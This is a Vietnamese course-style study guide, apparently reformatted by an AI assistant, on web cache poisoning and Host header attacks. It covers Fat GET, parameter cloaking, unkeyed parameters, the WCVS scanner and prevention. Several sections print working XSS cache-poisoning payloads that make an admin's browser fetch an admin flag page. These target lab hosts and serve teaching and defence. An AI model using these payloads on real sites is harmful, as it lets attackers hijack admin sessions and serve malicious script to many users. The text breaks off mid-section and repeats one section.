Hiểu rồi! Bạn muốn khi nhấp vào mục lục các tiêu đề, chúng sẽ dẫn thẳng đến nội dung liên quan đúng không? Sau đây là danh sách đã liên kết:  

---

# MỤC LỤC

1. [**Kỹ Thuật Tiến Tiến Trong Tấn Công Web Cache Poisoning**](#1-ky-thuat-tien-tien-trong-tan-cong-web-cache-poisoning)  
2. [**Giới Thiệu Về Lỗi Cấu Hình HTTP**](#gioi-thieu-ve-loi-cau-hinh-http)  
3. [**Giới Thiệu Về Tấn Công Web Cache Poisoning**](#gioi-thieu-ve-tan-cong-web-cache-poisoning)  
4. [**Xác Định Các Tham Số Không Được Đưa Vào Cache Key (Unkeyed Parameters)**](#xac-dinh-cac-tham-so-khong-duoc-dua-vao-cache-key-unkeyed-parameters)  
5. [**Tấn Công Web Cache Poisoning**](#tan-cong-web-cache-poisoning)  
6. [**Kỹ Thuật Web Cache Poisoning Nâng Cao**](#ky-thuat-web-cache-poisoning-nang-cao)  
7. [**Công Cụ và Phòng Ngừa Web Cache Poisoning**](#cong-cu-va-phong-ngua-web-cache-poisoning)  
8. [**Giới Thiệu về Các Cuộc Tấn Công Host Header**](#gioi-thieu-ve-cac-cuoc-tan-cong-host-header)  
9. [**Tấn Công Bỏ Qua Xác Thực (Authentication Bypass) qua Host Header**](#tan-cong-bo-qua-xac-thuc-authentication-bypass-qua-host-header)  
10. [**Tấn Công Password Reset Poisoning qua Host Header**](#tan-cong-password-reset-poisoning-qua-host-header)  
11. [**Tấn Công Web Cache Poisoning qua Host Header**](#tan-cong-web-cache-poisoning-qua-host-header)  
12. [**Tấn Công Bypass Kiểm Tra Host Header và Các Lỗ Hổng Validation**](#tan-cong-bypass-kiem-tra-host-header-va-cac-lo-hong-validation)  
13. [**Ngăn Ngừa Tấn Công Host Header**](#ngan-ngua-tan-cong-host-header)  
14. [**Giới Thiệu về Lỗ Hổng Session Puzzling**](#gioi-thieu-ve-lo-hong-session-puzzling)  
15. [**Lỗ Hổng Weak Session IDs**](#lo-hong-weak-session-ids)  
16. [**Common Session Variables và Lỗ Hổng Authentication Bypass**](#common-session-variables-va-lo-hong-authentication-bypass)  
17. [**Premature Session Population và Lỗ Hổng Authentication Bypass**](#premature-session-population-va-lo-hong-authentication-bypass)  
18. [**Common Session Variables và Lỗ Hổng Account Takeover**](#common-session-variables-va-lo-hong-account-takeover)  
19. [**Ngăn Chặn Session Puzzling Vulnerabilities**](#ngan-chan-session-puzzling-vulnerabilities)  

---


# 1. Kỹ Thuật Tiến Tiến Trong Tấn Công Web Cache Poisoning

Trong phần trước, chúng ta đã thảo luận về các kỹ thuật cơ bản để phát hiện và khai thác lỗ hổng web cache poisoning. Trong phần này, chúng ta sẽ tìm hiểu hai kỹ thuật tiên tiến khai thác các lỗi cấu hình của máy chủ web, biến các cấu hình tưởng chừng an toàn trở nên dễ bị tổn thương.

---

### **1. Fat GET**

#### **Khái niệm**
- **Fat GET** là các yêu cầu HTTP GET có chứa **request body** (phần nội dung trong yêu cầu).
- Theo tiêu chuẩn, GET parameters được truyền qua query string (phần sau dấu `?` trong URL). Việc gửi thêm **request body** trong GET là không cần thiết và không có ý nghĩa.
- Tuy nhiên, một số máy chủ bị cấu hình sai có thể xử lý các tham số trong **request body**, dẫn đến việc khai thác lỗ hổng **web cache poisoning**.

#### **Ví dụ minh họa**
- Xem xét ứng dụng web với URL sau:  
  ```http
  GET /index.php?language=en HTTP/1.1
  Host: fatget.wcp.htb
  ```
  **language** được đặt là `en` (tiếng Anh). Tuy nhiên, nếu ta gửi yêu cầu như sau:  
  ```http
  GET /index.php?language=en HTTP/1.1
  Host: fatget.wcp.htb
  Content-Length: 11
  language=de
  ```
  **language** trong **request body** là `de` (tiếng Đức). Nếu máy chủ ưu tiên giá trị trong **request body**, kết quả sẽ trả về trang bằng tiếng Đức.

#### **Tấn công Fat GET**
1. Xác nhận lỗ hổng:  
   - Gửi yêu cầu với **request body** và kiểm tra xem máy chủ xử lý tham số nào.
2. Poison cache:
   - Sử dụng **Fat GET** để gửi payload độc hại vào cache:
     ```http
     GET /index.php?language=de HTTP/1.1
     Host: fatget.wcp.htb
     Content-Length: 142
     ref="><script>var xhr = new XMLHttpRequest();xhr.open('GET', '/admin.php?reveal_flag=1', true);xhr.withCredentials = true;xhr.send();</script>
     ```
   - Khi admin truy cập, payload XSS sẽ được thực thi và tiết lộ thông tin nhạy cảm.

---

### **2. Parameter Cloaking**

#### **Khái niệm**
- Kỹ thuật này khai thác sự khác biệt trong cách máy chủ và bộ nhớ cache xử lý các tham số URL.
- Nếu bộ nhớ cache và máy chủ không đồng bộ trong việc nhận diện tham số URL, có thể tạo ra lỗ hổng.

#### **Ví dụ minh họa**
- Với framework Python Bottle (CVE-2020-28473), tham số URL có thể sử dụng dấu chấm phẩy `;` để phân tách:  
  ```http
  GET /?a=1;b=2
  ```
  - Bottle thấy:  
    - `a = 1`, `b = 2`
  - Bộ nhớ cache thấy:  
    - `a = 1;b=2`

#### **Tấn công Parameter Cloaking**
1. Tạo sự khác biệt giữa máy chủ và cache:
   ```http
   GET /?language=en&a=b;language=de HTTP/1.1
   Host: cloak.wcp.htb
   ```
   - Máy chủ xử lý `language=de` (tiếng Đức), trong khi bộ nhớ cache lưu `language=en`.

2. Poison cache:
   - Gửi payload độc hại với tham số được che giấu:
     ```http
     GET /?language=de&a=b;ref=%22%3E%3Cscript%3Evar%20xhr=new%20XMLHttpRequest();xhr.open('GET','/admin?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();%3C/script%3E HTTP/1.1
     Host: cloak.wcp.htb
     ```
   - Khi admin truy cập, script XSS sẽ được thực thi để lộ flag.

---

### **Lưu ý quan trọng**
- **Fat GET** thường do cấu hình sai của máy chủ web.
- **Parameter Cloaking** cần có sự khác biệt trong cách xử lý tham số giữa cache và máy chủ.

---
Dưới đây là tài liệu đã được viết lại với cách trình bày rõ ràng, dễ hiểu hơn:

---

# 2. Giới Thiệu Về Lỗi Cấu Hình HTTP

HTTP là một trong những giao thức được sử dụng phổ biến nhất trên Internet, hỗ trợ hàng tỷ thiết bị mỗi ngày. Với vai trò quan trọng của các ứng dụng web trong thế giới số, bảo mật web không chỉ dừng lại ở việc xem xét từng ứng dụng riêng lẻ, mà cần đánh giá tổng thể hệ thống, bao gồm cả các thành phần như máy chủ web và bộ nhớ đệm (web caches), những yếu tố làm tăng độ phức tạp và bề mặt tấn công.
---

### **Web Cache và Lỗ Hổng Tiềm Ẩn**
- **Web caches** được sử dụng trong các dịch vụ web để cải thiện hiệu suất bằng cách giảm tải cho máy chủ.  
- Khi một tài nguyên được yêu cầu, bộ nhớ đệm lưu trữ tài nguyên đó để có thể phục vụ các yêu cầu tương tự từ bộ nhớ cục bộ mà không cần yêu cầu lại từ máy chủ.  
- Tuy nhiên, sự phụ thuộc này cũng có thể dẫn đến lỗ hổng bảo mật nếu bộ nhớ đệm được cấu hình sai, tạo cơ hội cho các kiểu tấn công như **Web Cache Poisoning**.

---

### **Host Header và Vai Trò Của Nó**
- **Host header** là một phần bắt buộc trong mọi yêu cầu HTTP từ phiên bản HTTP/1.1, xác định tên miền hoặc cổng của máy chủ mà yêu cầu được gửi đến.  
- Khi một máy chủ phục vụ nhiều ứng dụng web, **host header** được sử dụng để định danh ứng dụng mục tiêu.  
- Nếu ứng dụng xử lý **host header** không đúng cách, có thể xuất hiện lỗ hổng cho phép kẻ tấn công thực hiện các **Host Header Attacks**.

---

### **Session Và Tầm Quan Trọng Của Nó**
- HTTP là giao thức **stateless** (không lưu trạng thái), vì vậy **sessions** được sử dụng để cung cấp ngữ cảnh cho các yêu cầu.  
- Thông qua session ID, ứng dụng web có thể nhận diện người dùng mà không cần xác thực trong mỗi yêu cầu.  
- Nếu session variables (biến phiên) được xử lý không đúng cách, có thể dẫn đến các lỗ hổng như **Session Puzzling**, gây nguy cơ chiếm quyền tài khoản hoặc vượt qua cơ chế xác thực.

---

### **Các Kiểu Tấn Công HTTP**

#### **1. Web Cache Poisoning**
- **Mục tiêu:** Khai thác lỗi cấu hình trong bộ nhớ đệm và các lỗ hổng của ứng dụng web cơ sở để tấn công người dùng không cảnh giác.  
- **Nguy hiểm:**  
  - Tự động khai thác chỉ bằng cách người dùng truy cập trang web mục tiêu.  
  - Biến các lỗ hổng khó khai thác thành vũ khí hiệu quả để tấn công hàng loạt nạn nhân.  

---

#### **2. Host Header Attacks**
- **Mục tiêu:** Tận dụng lỗi trong việc xử lý **host header** để:  
  - Bypass (vượt qua) kiểm tra ủy quyền.  
  - Tạo liên kết độc hại thông qua việc thao túng **host header**.  
- **Cách thức:**  
  - Lợi dụng các ứng dụng sử dụng **host header** để tạo liên kết tuyệt đối hoặc thực hiện kiểm tra bảo mật.  

---

#### **3. Session Puzzling**
- **Mục tiêu:** Khai thác lỗi trong việc xử lý session variables để:  
  - Vượt qua xác thực.  
  - Chiếm quyền điều khiển tài khoản.  
- **Nguyên nhân:**  
  - Tái sử dụng session variables trong các quy trình khác nhau.  
  - Gán giá trị mặc định không an toàn cho session variables.  
  - Quản lý session variables không đúng cách.

---

# 3. Giới Thiệu Về Tấn Công Web Cache Poisoning

**Web cache poisoning** là một phương thức tấn công tiên tiến nhằm ép bộ nhớ đệm web cung cấp nội dung độc hại cho người dùng không ngờ đến khi truy cập vào trang web bị tổn thương.  
- **Mục đích:** Lợi dụng bộ nhớ đệm để phân phối mã độc hoặc gia tăng mức độ nghiêm trọng của lỗ hổng, chẳng hạn như chuyển đổi **reflected XSS** thành một cuộc tấn công diện rộng mà không cần sự tương tác của người dùng.  
- **Ví dụ:** Tấn công có thể xảy ra trên các bộ nhớ đệm phổ biến như **Apache**, **Nginx**, và **Squid**.  

---

### **Nguyên Lý Hoạt Động Của Bộ Nhớ Đệm Web**

#### **Lợi Ích Của Caching**
- Khi một dịch vụ web có lượng người dùng lớn, khả năng mở rộng là rất quan trọng.  
- **Web caches** giúp giảm tải cho máy chủ bằng cách lưu trữ các tài nguyên cục bộ để phục vụ các yêu cầu tương tự trong tương lai mà không cần truy vấn máy chủ gốc.  
- **Cách hoạt động:**  
  - Nếu tài nguyên chưa được lưu, bộ nhớ đệm sẽ yêu cầu máy chủ và sau đó lưu lại để sử dụng cho các yêu cầu tiếp theo.  
  - Tài nguyên được lưu trong một khoảng thời gian giới hạn để đảm bảo các thay đổi trên máy chủ được cập nhật.

---

#### **Cách Bộ Nhớ Đệm Phân Biệt Yêu Cầu**
Bộ nhớ đệm sử dụng một tập hợp con của các thông số yêu cầu HTTP để xác định liệu hai yêu cầu có thể được phục vụ cùng một phản hồi hay không. Tập hợp này gọi là **Cache Key**.  
- **Cấu hình mặc định:**  
  - Bao gồm: **Đường dẫn yêu cầu (request path)**, **tham số GET**, và **Host header**.  
  - Không bao gồm: Các thông số không ảnh hưởng trực tiếp đến phản hồi như **User-Agent** hoặc **Referer**.

---

### **Ví Dụ Về Cache Key**

**Cấu hình mặc định:**
1. Yêu cầu đầu tiên:  
   ```plaintext
   GET /index.html?language=en HTTP/1.1
   Host: example.com
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
   ```
2. Yêu cầu thứ hai (khác **User-Agent**, nhưng Cache Key không thay đổi):  
   ```plaintext
   GET /index.html?language=en HTTP/1.1
   Host: example.com
   User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1)
   ```
   → **Kết quả:** Cả hai yêu cầu được phục vụ cùng một phản hồi.  

**Thay đổi Cache Key (thay đổi tham số GET):**
- Yêu cầu với tham số ngôn ngữ khác:  
   ```plaintext
   GET /index.html?language=de HTTP/1.1
   Host: example.com
   ```
   → **Kết quả:** Phản hồi khác do Cache Key thay đổi.

**Phân loại tham số:**
- **Keyed parameters:** Tham số nằm trong Cache Key (ví dụ: **GET parameters**, **Host header**).  
- **Unkeyed parameters:** Tham số không nằm trong Cache Key (ví dụ: **User-Agent**, **Referer**).  

---

### **Cấu Hình Bộ Nhớ Đệm Web Trong Nginx**

**Cấu hình mẫu Nginx:**
```nginx
http {
    proxy_cache_path /cache levels=1:2 keys_zone=STATIC:10m inactive=24h max_size=1g;
    server {
        listen 80;
        location / {
            proxy_pass http://172.17.0.1:80;
            proxy_buffering on;
            proxy_cache STATIC;
            proxy_cache_valid 2m;
            proxy_cache_key $scheme$proxy_host$uri$args;
            add_header X-Cache-Status $upstream_cache_status;
        }
    }
}
```

**Giải thích:**
1. `proxy_cache_path`: Thiết lập đường dẫn lưu trữ bộ nhớ đệm.  
2. `proxy_pass`: Địa chỉ máy chủ gốc.  
3. `proxy_buffering`: Kích hoạt caching.  
4. `proxy_cache_valid`: Thời gian tồn tại của bộ nhớ đệm (ví dụ: 2 phút).  
5. `proxy_cache_key`: Định nghĩa Cache Key (ví dụ: `$uri$args`).  
6. `add_header`: Thêm thông tin trạng thái cache (`X-Cache-Status`) vào phản hồi.

---

### **Cấu Hình Tùy Chỉnh Cache Key**

Ví dụ: Chỉ thêm tham số **language** vào Cache Key:  
```nginx
proxy_cache_key $scheme$proxy_host$uri$arg_language;
```

**Kết quả:**  
- Hai yêu cầu sau sẽ được phục vụ cùng một phản hồi:  
  ```plaintext
  GET /index.html?language=de&timestamp=1
  GET /index.html?language=de&timestamp=2
  ```
- **Lý do:** Tham số **timestamp** không nằm trong Cache Key.

---
# 4. Xác Định Các Tham Số Không Được Đưa Vào Cache Key (Unkeyed Parameters)

Trong tấn công **web cache poisoning**, mục tiêu là buộc bộ nhớ đệm phục vụ nội dung độc hại cho những người dùng khác. Điều này yêu cầu sử dụng **unkeyed parameters** để chèn payload độc hại vào phản hồi được lưu trữ.  
- Nếu tham số là **keyed**, yêu cầu của nạn nhân phải chứa chính payload độc hại đó, giống như trong tấn công **reflected XSS**, hạn chế khả năng tấn công hàng loạt.  

---

### **Ví Dụ: Phân Tích Unkeyed Parameters**

Giả sử một ứng dụng web dễ bị tấn công XSS qua tham số `ref` và hỗ trợ nhiều ngôn ngữ qua tham số `language`.  
- **`language` là keyed**, trong khi **`ref` là unkeyed.**  
- URL độc hại:  
  ```plaintext
  /index.php?language=en&ref="><script>alert(1)</script>
  ```
- Bộ nhớ đệm lưu lại phản hồi chứa mã độc và phục vụ cho tất cả yêu cầu `/index.php?language=en`.  

---

### **Xác Định Unkeyed Parameters**

1. **Nguyên tắc chung:**  
   - Quan sát sự thay đổi trong phản hồi khi thay đổi tham số.  
   - Nếu thay đổi giá trị tham số nhưng phản hồi vẫn giống nhau → tham số đó là **unkeyed.**  

2. **Ví dụ: Thử nghiệm với các tham số GET**
   - **Tham số `language` (keyed):**  
     - Yêu cầu đầu tiên: Cache miss.  
     - Yêu cầu thứ hai (cùng giá trị): Cache hit.  
     - Thay đổi giá trị → Cache miss.  

   - **Tham số `content` (keyed):**  
     - Tương tự như `language`, các giá trị khác nhau dẫn đến cache miss.  

   - **Tham số `ref` (unkeyed):**  
     - Yêu cầu đầu tiên: Cache miss.  
     - Yêu cầu với giá trị khác của `ref`: Cache hit.  

---

### **Thực Hiện Tấn Công**

1. **Xác định XSS qua tham số unkeyed (`ref`):**  
   - URL độc hại:  
     ```plaintext
     /index.php?language=unusedvalue&ref="><script>alert(1)</script>
     ```
   - **Lưu ý:** Dùng giá trị `language` chưa từng sử dụng trước đó để tránh phản hồi được lấy từ cache.  

2. **Kịch bản tấn công:**  
   - Poison cache với payload:  
     ```html
     <script>
       var xhr = new XMLHttpRequest();
       xhr.open('GET', '/admin.php?reveal_flag=1', true);
       xhr.withCredentials = true;
       xhr.send();
     </script>
     ```
   - URL để poison cache:  
     ```plaintext
     GET /index.php?language=de&ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%27GET%27,%20%27/admin.php?reveal_flag=1%27,%20true);xhr.withCredentials%20=%20true;xhr.send();%3C/script%3E
     ```

3. **Kết quả:**  
   - Khi admin truy cập trang `/index.php?language=de`, payload được kích hoạt, và phản hồi `/admin.php?reveal_flag=1` được gửi đến kẻ tấn công.

---

### **Phân Tích Headers Không Được Đưa Vào Cache Key**

Tương tự với tham số GET, một số HTTP headers cũng có thể là **unkeyed**:  
- **Ví dụ:** Header `X-Backend-Server` (unkeyed).  
  - Header này ảnh hưởng đến vị trí tải script debug.  

**Payload qua header:**
```plaintext
GET /index.php?language=de HTTP/1.1
Host: webcache.htb
X-Backend-Server: testserver.htb"></script><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script>
```

---
# 5. Tấn Công Web Cache Poisoning

Tấn công **web cache poisoning** chủ yếu nhằm khai thác lỗ hổng tiềm ẩn trong ứng dụng web để phân phối rộng rãi đến nhiều người dùng. Dưới đây là tổng quan về khai thác, tác động và các kỹ thuật thực hiện.

---

### **Cách Khai Thác Web Cache Poisoning**

#### 1. **Xác định tham số hoặc tiêu đề không được đưa vào cache key (unkeyed):**
   - Phát hiện các tham số GET, cookies hoặc HTTP headers không được đưa vào cache key.
   - Gửi yêu cầu thử nghiệm để xem xét các thay đổi trong phản hồi.

#### 2. **Tấn công dựa trên thời gian hết hạn của bộ nhớ đệm:**
   - Tấn công cần gửi yêu cầu độc hại ngay khi cache hết hạn để đảm bảo phản hồi độc hại được lưu trữ.  
   - Việc này đòi hỏi **phán đoán thời gian chính xác** hoặc dựa vào thông tin về **thời gian tồn tại cache** (TTL) trong header `Cache-Control`.

#### 3. **Bypass bộ nhớ đệm (Cache Bypass):**
   - Sử dụng header:
     - `Cache-Control: no-cache`  
     - `Pragma: no-cache` (deprecated)
   - Những header này buộc yêu cầu được xử lý trực tiếp bởi máy chủ thay vì lấy từ cache. Tuy nhiên, chúng không làm mới nội dung đã được lưu trữ trong cache.

---

### **Các Hình Thức Khai Thác**

#### **1. Cross-Site Scripting (XSS):**
   - **Sử dụng tham số GET hoặc header không được đưa vào cache key:**  
     Ví dụ, khai thác tham số `ref` hoặc header `X-Backend-Server` để chèn payload XSS.  

     **Payload mẫu:**  
     ```plaintext
     GET /index.php?language=de&ref="><script>alert(1)</script> HTTP/1.1
     Host: webcache.htb
     ```

   - **Tấn công thực tế:** Poison cache với payload để khi admin truy cập, mã XSS sẽ tự động thực thi nhằm gửi yêu cầu lấy thông tin nhạy cảm.

#### **2. Khai thác Cookies Không Được Đưa Vào Cache Key (Unkeyed Cookies):**
   - **Kịch bản:** Cookie như `language=en` hoặc `consent=1` được lưu trong cache mà không phân biệt giá trị.
   - **Tác động:**  
     - Tất cả người dùng bị buộc phải sử dụng các giá trị cookie độc hại, ví dụ:
       - Đổi giao diện thành `color=blue`.  
       - Buộc hiện nội dung mà họ chưa đồng ý.

#### **3. Tấn công từ chối dịch vụ (Denial-of-Service - DoS):**
   - **Ví dụ:**  
     - Bộ nhớ đệm sử dụng header `Host` nhưng loại bỏ cổng trước khi lưu cache.  
     - Yêu cầu độc hại:
       ```plaintext
       GET / HTTP/1.1
       Host: webcache.htb:1337
       ```
     - Khi phản hồi này được lưu trữ, người dùng khác bị chuyển hướng đến một cổng không hợp lệ, dẫn đến DoS.

---

### **Cache Busters**

**Cache busters** được sử dụng để đảm bảo rằng nội dung độc hại chỉ ảnh hưởng đến các thử nghiệm, không gây tác động đến người dùng thực tế.  

#### **Cách sử dụng:**
   - Thêm một tham số duy nhất trong yêu cầu thử nghiệm để tạo cache key khác biệt.  
   - **Ví dụ:**  
     ```plaintext
     GET /index.php?language=unusedvalue&ref="><script>alert(1)</script> HTTP/1.1
     Host: webcache.htb
     ```
   - Sau mỗi lần thử nghiệm, điều chỉnh tham số `language` để tạo giá trị mới, đảm bảo không trùng lặp cache key.

---

### **Tác Động Của Web Cache Poisoning**

1. **Phụ thuộc vào lỗ hổng cơ bản:**  
   - Tấn công chủ yếu dựa vào các vấn đề đã tồn tại trong ứng dụng web, ví dụ như XSS, host header injection, hoặc cookie misconfiguration.

2. **Độ tin cậy và số lượng nạn nhân:**  
   - Tác động cao nếu có nhiều người dùng bị ảnh hưởng trong thời gian cache tồn tại.  

3. **Cấu hình cache:**  
   - Nếu các header như `User-Agent` được đưa vào cache key, kẻ tấn công phải khai thác từng nhóm mục tiêu cụ thể.

---


**Kết quả:**  
- Header `X-Backend-Server` chứa payload XSS, được lưu trong cache và kích hoạt khi admin truy cập trang.

---
# 6. Kỹ Thuật Web Cache Poisoning Nâng Cao

Trong phần này, chúng ta sẽ tìm hiểu hai kỹ thuật web cache poisoning nâng cao, bao gồm **Fat GET** và **Parameter Cloaking**, khai thác các lỗi cấu hình trên máy chủ web để làm lộ các cấu hình vốn dĩ an toàn.

---

### **1. Fat GET Requests**

#### **Khái niệm:**
- **Fat GET** là các yêu cầu HTTP GET có kèm **request body**. Theo chuẩn HTTP, GET request không được định nghĩa để sử dụng body, nhưng không bị cấm.
- Một số máy chủ web, khi bị cấu hình sai, có thể xử lý các tham số từ request body, dẫn đến các lỗi web cache poisoning.

#### **Ví dụ Khai Thác Fat GET:**
1. **Xác định lỗi:**
   - Gửi một yêu cầu Fat GET để kiểm tra liệu server có xử lý các tham số từ body không.  
     **Payload mẫu:**
     ```plaintext
     GET /index.php?language=en HTTP/1.1
     Host: fatget.wcp.htb
     Content-Length: 11
     language=de
     ```
   - Nếu phản hồi hiển thị nội dung bằng tiếng Đức (German) thay vì tiếng Anh (English), máy chủ xử lý tham số từ request body.

2. **Poison Cache:**
   - Gửi yêu cầu Fat GET chứa payload độc hại.  
     **Payload mẫu:**
     ```plaintext
     GET /index.php?language=de HTTP/1.1
     Host: fatget.wcp.htb
     Content-Length: 142
     ref="><script>var xhr = new XMLHttpRequest();
     xhr.open('GET', '/admin.php?reveal_flag=1', true);
     xhr.withCredentials = true;
     xhr.send();</script>
     ```
   - Yêu cầu trên sẽ chèn payload XSS vào cache. Khi admin truy cập, payload sẽ tự động thực thi, gửi yêu cầu để lộ flag.

#### **Lưu ý:**
- Fat GET thường do lỗi cấu hình trên phần mềm máy chủ web, không phải do ứng dụng web.

---

### **2. Parameter Cloaking**

#### **Khái niệm:**
- **Parameter Cloaking** khai thác sự khác biệt trong cách phân tích tham số giữa web cache và máy chủ web.
- Khi web cache và máy chủ xử lý các tham số GET khác nhau, kẻ tấn công có thể tạo ra sự sai lệch để khai thác lỗ hổng.

#### **Ví dụ Khai Thác:**
1. **Khai thác lỗi Parameter Cloaking trong Bottle Framework (CVE-2020-28473):**
   - Bottle sử dụng ký tự **semicolon (;)** để phân tách tham số, trong khi web cache không xử lý ký tự này.
   - Gửi yêu cầu:  
     ```plaintext
     GET /?language=en&a=b;language=de HTTP/1.1
     Host: cloak.wcp.htb
     ```
   - **Phân tích:**  
     - **Web cache:**  
       - Tham số: `language=en`, `a=b;language=de`.  
       - Lưu phản hồi dựa trên `language=en`.  
     - **Bottle server:**  
       - Tham số: `language=en`, `a=b`, `language=de`.  
       - Giá trị cuối cùng của `language` là `de`, phản hồi bằng tiếng Đức.

2. **Poison Cache:**
   - Gửi yêu cầu độc hại với payload XSS, sử dụng `;` để che giấu tham số:  
     **Payload mẫu:**
     ```plaintext
     GET /?language=de&a=b;ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();
     xhr.open('GET','/admin?reveal_flag=1',true);
     xhr.withCredentials=true;
     xhr.send();%3C/script%3E HTTP/1.1
     Host: cloak.wcp.htb
     ```
   - Khi admin truy cập URL, payload sẽ được thực thi và flag sẽ bị lộ.

---

### **So Sánh Fat GET và Parameter Cloaking**

| **Yếu Tố**            | **Fat GET**                                  | **Parameter Cloaking**                       |
|------------------------|----------------------------------------------|---------------------------------------------|
| **Khai thác**          | Xử lý tham số từ request body               | Phân tích khác biệt giữa web cache & server |
| **Ví dụ cụ thể**       | Tham số trong request body                  | Dùng `;` để "ẩn" tham số độc hại            |
| **Đặc điểm**           | Do lỗi máy chủ, không do ứng dụng           | Do lỗi phân tích tham số                    |

---
# 7. Công Cụ và Phòng Ngừa Web Cache Poisoning

#### **1. Công Cụ Tìm Lỗ Hổng Web Cache Poisoning**

Một trong những công cụ quan trọng để phát hiện lỗ hổng web cache poisoning là **Web-Cache-Vulnerability-Scanner (WCVS)**. Công cụ này giúp xác định các tham số nào của yêu cầu bị khóa (keyed) và tham số nào không bị khóa (unkeyed). WCVS sẽ tự động thêm cache buster vào mỗi yêu cầu để tránh vô tình làm nhiễu các phản hồi của người dùng khác.

**Cách sử dụng WCVS:**
1. Tải và giải nén công cụ:
   ```bash
   tar xzf web-cache-vulnerability-scanner_1.1.0_linux_amd64.tar.gz
   ./wcvs -h
   ```

2. Chạy quét web application:
   ```bash
   ./wcvs -u http://simple.wcp.htb/ -sp language=en -gr
   ```
   - **-u**: URL của ứng dụng web cần quét.
   - **-sp**: Đặt tham số GET, ví dụ `language=en`.
   - **-gr**: Tạo báo cáo.

3. Kết quả sẽ xuất hiện trong báo cáo JSON, chỉ ra các tham số gây lỗi cache poisoning, ví dụ:
   ```json
   {
     "technique": "Parameters",
     "isVulnerable": true,
     "requests": [
       {
         "reason": "Response Body contained 793369015723",
         "request": "GET /?language=en&ref=793369015723&cb=829054467467 HTTP/1.1",
         "response": ""
       }
     ]
   }
   ```

4. WCVS cũng giúp phát hiện các kỹ thuật web cache poisoning nâng cao như **Fat GET** và **Parameter Cloaking**.

---

#### **2. Phòng Ngừa Web Cache Poisoning**

Phòng ngừa web cache poisoning đòi hỏi sự cấu hình đúng đắn và sự nhận thức rõ ràng về sự tương tác giữa máy chủ web và hệ thống cache. Một số biện pháp phòng ngừa bao gồm:

- **Cấu hình web cache đúng cách**: Tránh sử dụng cấu hình mặc định của web cache. Các tham số yêu cầu ảnh hưởng đến nội dung phản hồi phải được **khóa** (keyed) để đảm bảo rằng cache sử dụng đúng tham số khi lưu trữ và phục vụ dữ liệu.
  
- **Không hỗ trợ Fat GET**: Máy chủ web cần phải **không cho phép** các GET request chứa request body. Điều này giúp tránh các lỗi mà kẻ tấn công có thể khai thác bằng cách gửi GET với body chứa tham số độc hại.

- **Giữ web cache và máy chủ web cập nhật**: Việc cập nhật thường xuyên giúp giảm thiểu các lỗi cấu hình và các lỗ hổng bảo mật có thể tạo ra các lỗ hổng trong quá trình phân tích yêu cầu.

- **Giám sát và sửa chữa các lỗ hổng client-side**: Ngay cả khi lỗ hổng XSS (Cross-Site Scripting) không thể khai thác một cách truyền thống (ví dụ, qua XSS phản chiếu), web cache poisoning có thể làm cho các lỗ hổng này trở thành mối nguy hiểm. Do đó, tất cả các lỗ hổng client-side cần phải được vá kịp thời.

- **Đánh giá lại việc sử dụng web cache**: Nếu không cần thiết, việc sử dụng web cache có thể gây phức tạp trong triển khai. Một lựa chọn là chỉ cache các tài nguyên tĩnh như **stylesheets** và **scripts**, qua đó giảm thiểu khả năng bị web cache poisoning. Tuy nhiên, cần đảm bảo rằng không có lỗi khi web cache được lừa dối và lưu trữ các tài nguyên không tĩnh.

#### **Lưu Ý Phòng Ngừa:**

1. **Cấu hình Keyed Parameters**: Đảm bảo rằng mỗi tham số có ảnh hưởng đến phản hồi (như `language`, `ref`, v.v.) đều phải được **khóa** khi lưu trữ trong cache.

2. **Giới hạn Caching**: Nếu không cần thiết, có thể **hạn chế** việc cache chỉ đối với các tài nguyên tĩnh, điều này có thể tránh được việc web cache poisoning.

---
# 8. Giới Thiệu về Các Cuộc Tấn Công Host Header

#### **1. HTTP Host Header**

**Host header** là một header bắt buộc kể từ phiên bản HTTP/1.1 và nó chỉ định máy chủ mục tiêu mà yêu cầu HTTP sẽ gửi đến. Đây là một yếu tố quan trọng khi một máy chủ web chạy nhiều ứng dụng khác nhau và cần phân biệt giữa chúng. Tùy thuộc vào giá trị của **Host header** trong yêu cầu, máy chủ web sẽ trả về phản hồi khác nhau.

Điều này đặc biệt quan trọng trong các môi trường mà một máy chủ web có thể chạy nhiều ứng dụng web khác nhau trên cùng một địa chỉ IP và cổng (thường là cổng 80 hoặc 443). Các máy chủ web và **Content Delivery Networks** (CDNs) như Akamai hoặc Cloudflare sử dụng Host header để quyết định ứng dụng web nào sẽ phục vụ yêu cầu đó. Tuy nhiên, nếu một yêu cầu thiếu **Host header hợp lệ**, nó có thể dẫn đến các vấn đề trong việc định tuyến yêu cầu đến đúng ứng dụng web.

**Ví dụ về cấu hình Apache cho hai ứng dụng web khác nhau:**
```apache
<VirtualHost *:80>
    DocumentRoot "/var/www/testapp"
    ServerName testapp.htb
</VirtualHost>

<VirtualHost *:80>
    DocumentRoot "/var/www/anotherdomain"
    ServerName anotherdomain.org
</VirtualHost>
```
Trong ví dụ này, hai ứng dụng web sẽ được phục vụ từ các đường dẫn khác nhau trên hệ thống, và Apache sẽ quyết định ứng dụng nào sẽ phục vụ dựa trên giá trị của **Host header** trong yêu cầu HTTP. Nếu **Host header** là `testapp.htb`, máy chủ sẽ phục vụ ứng dụng `testapp`. Nếu giá trị là `anotherdomain.org`, máy chủ sẽ phục vụ ứng dụng thứ hai.

---

#### **2. Các Lỗ Hổng Host Header**

Các lỗ hổng **Host header** xảy ra khi ứng dụng web không kiểm tra hoặc làm sạch đúng cách giá trị của Host header. Điều này có thể dẫn đến các vấn đề bảo mật nghiêm trọng:

- **Bỏ qua xác thực**: Một ứng dụng web không nên sử dụng **Host header** để kiểm tra xác thực. Nếu ứng dụng tin tưởng vào giá trị của Host header mà không kiểm tra đúng cách, kẻ tấn công có thể thay đổi Host header để bỏ qua các biện pháp xác thực, chẳng hạn như đăng nhập.
  
